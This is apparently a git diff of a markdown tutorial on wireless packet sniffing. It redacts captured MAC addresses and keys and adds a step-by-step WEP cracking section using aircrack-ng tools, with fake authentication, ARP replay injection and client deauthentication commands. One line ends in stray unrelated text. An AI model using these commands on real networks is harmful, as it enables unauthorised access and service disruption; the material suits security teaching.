@@ -143,39 +143,10 @@ To sniff packets on a network without being connected, you need to switch your w
 
 First, you need to identify the wireless adapter you want to use. You can do this by running the command `iwconfig`, which lists all wireless interfaces and their current modes. Once you know the adapter’s name (for example, `wlan0`), you can change its mode from managed to monitor using the command `sudo airmon-ng start wlan0`.
 
-```bash
-┌──(proxygeek㉿VMware-kali)-[~]
-└─$ sudo airmon-ng start wlan0         
-
-Found 2 processes that could cause trouble.
-Kill them using 'airmon-ng check kill' before putting
-the card in monitor mode, they will interfere by changing channels
-and sometimes putting the interface back in managed mode
-
-    PID Name
-   5584 NetworkManager
-   5732 wpa_supplicant
-
-PHY     Interface       Driver          Chipset
-
-phy0    wlan0           rtl8814au       Realtek Semiconductor Corp. RTL8814AU 802.11a/b/g/n/ac
-                (mac80211 monitor mode already enabled for [phy0]wlan0 on [phy0]10)
-```
-
 > [!NOTE]
-> On some wireless adapters, enabling monitor mode creates a new interface with a `mon` suffix (e.g., `wlan0mon`). However, some adapters, like the Realtek RTL8814AU, enable monitor mode directly on the existing interface without renaming it.
+> On some wireless adapters, enabling monitor mode creates a new interface with a `mon` suffix (e.g., `wlan0mon`). However, some adapters, like the Realtek RTL8814AU, enable monitor mode directly on the existing interface without renaming it.ar15 lf556ar15 lf556
 
 After switching to monitor mode, you can verify that the change was successful by running `iwconfig` again. This will show the new mode and the updated interface name. When you are done with packet sniffing and want to revert to the standard managed mode, you can stop monitor mode by running `sudo airmon-ng stop wlan0` (or the appropriate interface name). This will restore your adapter to its normal state, ready to connect to networks as usual.
-
-```bash
-┌──(proxygeek㉿VMware-kali)-[~]
-└─$ sudo airmon-ng stop wlan0 
-
-PHY     Interface       Driver          Chipset
-
-phy0    wlan0           rtl8814au       Realtek Semiconductor Corp. RTL8814AU 802.11a/b/g/n/ac
-                (monitor mode disabled)
-```
 
 Switching to monitor mode is a powerful technique that gives you deep insight into wireless traffic around you, but remember to always use it responsibly and respect privacy and legal guidelines.
 
@@ -195,36 +166,15 @@ Once this is done, use `airodump-ng` followed by the name of the adapter to list
                                                                                                                                                             
  BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID                                                                            
                                                                                                                                                             
- D2:57:AE:4D:FB:67  -28       28        0    0   6   54   WPA2 CCMP   PSK  MiFibra-5-D6G3                                                                   
- 9E:B9:D9:28:98:08  -28       28        0    0   6   54   WPA2 CCMP   PSK  WIFI-JUAN                                                                       
- F0:9F:C2:71:22:10  -28       28       36    0   6   54   OPN              wifi-guest                                                                      
- F0:9F:C2:71:22:12  -28       28       26    0   6   54   WPA2 CCMP   PSK  wifi-mobile                                                                     
- F0:9F:C2:11:0A:24  -28       26        0    0  11   54e  WPA3 CCMP   SAE  wifi-management                                                                 
- F0:9F:C2:6A:88:26  -28       26        0    0  11   54   OPN              <length:  9>                                                                    
- F0:9F:C2:1A:CA:25  -28       26        0    0  11   54e  WPA3 CCMP   SAE  wifi-IT                                                                         
- CA:23:53:5F:4D:1E  -28       28        0    0   9   54   WPA2 TKIP   PSK  vodafone7123                                                                    
- BA:CD:DE:5F:67:03  -28       57        0    0   3   54   WPA2 CCMP   PSK  MOVISTAR_JYG2                                                                   
- F0:9F:C2:71:22:11  -28       57     2256   29   3   54   WEP  WEP         wifi-old                                                                         
+...                                                                 
+ XX:XX:XX:XX:XX:XX  -28       57     2256   29   3   54   WEP  WEP         wifi-old                                                                         
 
  BSSID              STATION            PWR    Rate    Lost   Frames  Notes  Probes
-
- F0:9F:C2:71:22:10  B0:72:BF:44:B0:49  -29   54 -54      0       10                                                                                         
- F0:9F:C2:71:22:10  80:18:44:BF:72:47  -29   54 -54      0       10                                                                                         
- F0:9F:C2:71:22:10  B0:72:BF:B0:78:48  -29   54 -54      0       16                                                                                         
- F0:9F:C2:71:22:12  28:6C:07:6F:F9:44  -29   54 -54      0       26                                                                                         
- F0:9F:C2:71:22:11  62:B2:93:BA:E5:6E  -29   54 -54   1737     2252                                                                                         
- (not associated)   64:32:A8:BA:6C:41  -26    0 - 1      0        2         wifi-corp                                                                       
- (not associated)   1A:01:F0:BA:C2:79  -49    0 - 1      0        2                                                                                         
- (not associated)   9A:8D:59:B9:D4:B6  -49    0 - 1      0        2                                                                                         
- (not associated)   66:2F:64:09:FD:A3  -49    0 - 1      0        2                                                                                         
- (not associated)   64:32:A8:07:6C:40  -26    0 - 1      0        3         AP_router,wifi-corp                                                             
- (not associated)   0E:36:7D:32:3F:42  -49    0 - 1      0        1                                                                                         
- (not associated)   64:32:A8:AD:AB:53  -49    0 - 1      0        4         wifi-corp-legacy                                                                
- (not associated)   78:C1:A7:BF:72:46  -49    0 - 1      0        9         wifi-offices,Jason                                                              
- (not associated)   B4:99:BA:6F:F9:45  -49    0 - 1      0        9         wifi-offices,Jason                                                              
- (not associated)   B2:D8:F6:6C:2F:A6  -49    0 - 1      0        1                                                                                         
- (not associated)   64:32:A8:BA:18:42  -26    0 - 1      0        2                                                                                         
- (not associated)   64:32:A8:BC:53:51  -26    0 - 1      0        4         open-wifi,home-WiFi,WiFi-Restaurant   
+                                                                                        
+ XX:XX:XX:XX:XX:X   XX:XX:XX:XX:XX:XX  -29   54 -54   1737     2252                                                                                         
+ (not associated)   XX:XX:XX:XX:XX:XX  -49    0 - 1      0        2                                                                                         
+ (not associated)   XX:XX:XX:XX:XX:XX  -49    0 - 1      0        2                                                                                         
+ ...
 ```
 
 In my case, the Access Point named `wifi-old` is using a WEP connection. Now we will capture packets from this target network.
@@ -232,17 +182,17 @@ To do so, run the following command to capture packets, replacing the BSSID and 
 
 ```bash
 ┌──(proxygeek㉿VMware-kali)-[~]
-└─$ sudo airodump-ng --bssid F0:9F:C2:71:22:11 -c 3 -w wep.cap wlan0
+└─$ sudo airodump-ng --bssid <target-BSSID> -c <channel> -w wep.cap wlan0
 
 CH  3 ][ Elapsed: 24 s ][ 2025-06-01 20:41            
                                                        
  BSSID              PWR RXQ  Beacons    #Data, #/s  CH 
                                                        
- F0:9F:C2:71:22:11  -28   0      268    10561  384   3 
+ XX:XX:XX:XX:XX:XX  -28   0      268    10561  384   3 
                                                        
  BSSID              STATION            PWR    Rate     
                                                        
- F0:9F:C2:71:22:11  62:B2:93:BA:E5:6E  -29   54 -54      0    10534 
+ XX:XX:XX:XX:XX:XX  XX:XX:XX:XX:XX:XX  -29   54 -54      0    10534 
 ```
 
 The `--write` option saves all captured packets to the specified file. Capture around 10,000 packets; the capture file will be saved in your current working directory.
@@ -258,7 +208,7 @@ Read 24937 packets.
 
    #  BSSID  Got 24776 out of 20000 IVsStarting PTW attack with 24776 ivs.
 
-   1  F0:9F:C2:71:22:11  wifi-old                  WEP (24776 IVs)
+   1  XX:XX:XX:XX:XX:XX  <ESSID>                 WEP (24776 IVs)
 
 Choosing first network as target.
 
@@ -276,16 +226,110 @@ Attack will be restarted every 5000 captured ivs.
     [00:00:00] Tested 6 keys (got 24776 IVs)
 
    KB    depth   byte(vote)
-    0    0/  1   11(35840) 86(32256) C1(30208) 
-    1    0/  5   F5(32000) 26(31232) 35(31232) 
-    2    0/  1   33(34816) BF(31232) B5(30976) 
-    3    0/  1   CD(33792) EA(31744) F6(30976) 
-    4    0/  1   55(32768) 23(31488) 7B(31488) 
+    0    0/  1   XX(35840) XX(32256) XX(30208) 
+    1    0/  5   XX(32000) XX(31232) XX(31232) 
+    2    0/  1   XX(34816) XX(31232) XX(30976) 
+    3    0/  1   XX(33792) XX(31744) XX(30976) 
+    4    0/  1   XX(32768) XX(31488) XX(31488) 
 
-                         KEY FOUND! [ 11:BB:33:CD:55 ] 
+                         KEY FOUND! [ XX:XX:XX:XX:XX ] 
         Decrypted correctly: 100%
 
 ```
+
+### Case 2: Accelerating ARP Replay (WEP Active Attack)
+
+In Case 1, we passively captured packets on a busy network to collect enough IVs to eventually crack the WEP key. However, this approach becomes inefficient on a quiet or low-traffic network. To address this, we can trigger the network to generate traffic using an **ARP replay attack**. This method injects ARP requests, which forces the Access Point to respond, thereby increasing the number of encrypted packets (and IVs) we can collect.
+
+This is considered an **active attack** because we are actively injecting packets into the network to provoke responses.
+
+This approach is effective when at least one client is associated with the access point. Without an active client, this method won’t work.
+
+First, make sure your wireless adapter is in monitor mode.
+
+Use the following command to start listening and identify a WEP-encrypted network and its associated clients:
+
+```bash
+┌──(proxygeek㉿VMware-kali)-[~]
+└─$ airodump-ng wlan0
+```
+
+We associate ourselves with the access point so it accepts our injection packets. This is done using the following command:
+
+```bash
+┌──(proxygeek㉿VMware-kali)-[~]
+└─$ sudo aireplay-ng -1 3600 -q 10 -a <target-BSSID> wlan0
+
+Waiting for beacon frame (BSSID: XX:XX:XX:XX:XX:XX) on channel 6
+Authentication successful
+Association successful :-) (AID: 1)
+Sending keep-alive packet every 10 seconds...
+```
+
+- `-1` Fake auth attack
+- `3600` Keep association for 1 hour
+- `-q 10` Send keep-alive every 10 seconds
+- `-a` BSSID of the target AP
+
+The **BSSID**, **channel**, and a client’s MAC address connected to the target network. Once identified, start a targeted packet capture:
+
+> [!TIP]
+> If no clients are currently connected, you won’t be able to perform the ARP replay attack effectively. Consider switching to a different AP or wait until a device connects.
+
+```bash
+┌──(proxygeek㉿VMware-kali)-[~]
+└─$ airodump-ng --bssid <target-BSSID> -c <channel> -w wep-arp wlan0
+```
+
+Then, in another terminal, send ARP request packets to stimulate traffic:
+
+```bash
+┌──(proxygeek㉿VMware-kali)-[~]
+└─$ aireplay-ng --arpreplay -b <target-BSSID> -h <client-MAC> wlan0
+
+18:57:12  Waiting for beacon frame (BSSID: XX:XX:XX:XX:XX:XX) on channel 6
+18:57:13  Found BSSID "XX:XX:XX:XX:XX:XX" on channel 6
+18:57:14  Using the MAC address of the client: XX:XX:XX:XX:XX:XX
+18:57:15  Sending ARP request packets...
+18:57:16  Got ARP request from client XX:XX:XX:XX:XX:XX
+18:57:16  Injecting ARP request to access point
+18:57:17  ARP packet reinjected successfully (1/30 sent)
+18:57:18  ARP packet reinjected successfully (2/30 sent)
+18:57:19  ARP packet reinjected successfully (3/30 sent)
+...
+```
+
+- `-b` BSSID of the target access point.
+- `-h` MAC address of the associated client.
+
+You should start seeing a significant increase in the number of captured data packets in your `airodump-ng` session.
+
+Once you’ve captured enough IVs (typically 10,000+), attempt to crack the key using:
+
+```bash
+┌──(proxygeek㉿VMware-kali)-[~]
+└─$ aircrack-ng wep-arp.cap
+```
+
+If successful, the WEP key will be displayed, allowing access to the network.
+
+> [!TIP]
+> If you don't see packets increasing, try sending a few deauth packets to refresh the client's connection:
+
+```bash
+┌──(proxygeek㉿VMware-kali)-[~]
+└─$ aireplay-ng --deauth 5 -a <target-BSSID> -c <client-MAC> wlan0
+
+18:55:44  Waiting for beacon frame (BSSID: XX:XX:XX:XX:XX:XX) on channel 6
+18:55:45  Sending DeAuth to station -- STMAC: [XX:XX:XX:XX:XX:XX]
+18:55:45  DeAuth packet sent 1/5
+18:55:46  DeAuth packet sent 2/5
+18:55:47  DeAuth packet sent 3/5
+18:55:48  DeAuth packet sent 4/5
+18:55:49  DeAuth packet sent 5/5
+```
+
+At the end of the process, remember to disable monitor mode and switch your adapter back to managed mode
 
 ## Monitoring
 
